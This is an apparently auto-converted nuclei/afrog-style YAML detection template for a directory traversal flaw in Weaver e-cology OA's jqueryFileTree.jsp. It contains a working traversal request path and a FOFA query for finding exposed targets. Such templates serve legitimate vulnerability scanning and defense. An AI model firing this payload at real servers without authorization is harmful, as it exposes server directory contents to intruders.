# 来源: afrog（转换自 afrog/xray 表达式 POC）
http:
  - matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - index.jsp
          - PortalCenter.jsp
          - PortalSettingOperation.jsp
        condition: and
    method: GET
    path:
      - '{{BaseURL}}/hrm/hrm_e9/orgChart/js/jquery/plugins/jqueryFileTree/connectors/jqueryFileTree.jsp?dir=/page/resource/userfile/../../'
id: ecology-jqueryfiletree-directory-traversal
info:
  author: zan8in
  description: |-
    泛微e-cology是专为大中型企业制作的OA办公系统,支持PC端、移动端和微信端同时办公等，其中 jqueryFileTree.jsp 文件中 dir 参数存在目录遍历漏洞，攻击者通过漏洞可以获取服务器文件目录信息
    fofa: app="泛微-协同办公OA"
  metadata:
    argus-execution-class: detection
    argus-import-license: MIT License
    argus-import-source: afrog
    argus-risk-level: high
  name: 泛微OA E-Cology jqueryFileTree.jsp 目录遍历漏洞
  severity: high
  tags: weaver,ecology,directory-traversal,argus-import
